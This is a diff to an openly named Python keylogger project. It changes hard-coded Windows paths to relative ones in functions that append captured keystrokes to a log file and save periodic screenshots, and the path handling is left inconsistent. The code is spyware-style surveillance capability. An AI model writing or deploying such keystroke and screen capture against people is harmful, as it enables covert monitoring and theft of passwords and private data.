@@ -18,7 +18,7 @@ class IntervalTimer(Timer):         #Control the Time interval between each Scre
             
             
 def write_file(keys):                  #To write the keys to the Files
-    with open("C:/Users/ARYAN/Desktop/Keylogger-master/log.txt","a") as f:
+    with open("Desktop/Keylogger-master/log.txt","a") as f:
         for key in keys:
             k=str(key).replace("'","")
             if k.find("space")>0:      #Replace Key_Space with " " in the main file
@@ -32,7 +32,7 @@ def write_file(keys):                  #To write the keys to the Files
 class keylogger_main:
     
     def _build_logs(self):   #To create the directory which contains all the data
-        if not os.path.exists('C:/Users/ARYAN/Desktop/Keylogger-master'):
+        if not os.path.exists('Desktop/Keylogger-master'):
             os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master')
             os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master/Screenshots')
             os.mknod('C:/Users/ARYAN/Desktop/Keylogger-master/log.txt')
@@ -54,7 +54,7 @@ class keylogger_main:
             
     def _Screenshot(self):           #Main Function to start thr Screenshot tracker
         sct=mss()
-        sct.shot(output='C:/Users/ARYAN/Desktop/Keylogger-master/Screenshots/{}.png'.format(time.time()))
+        sct.shot(output='Desktop/Keylogger-master/Screenshots/{}.png'.format(time.time()))
     
     def run(self,interval):          #Main fucntion to start the keylogger
         
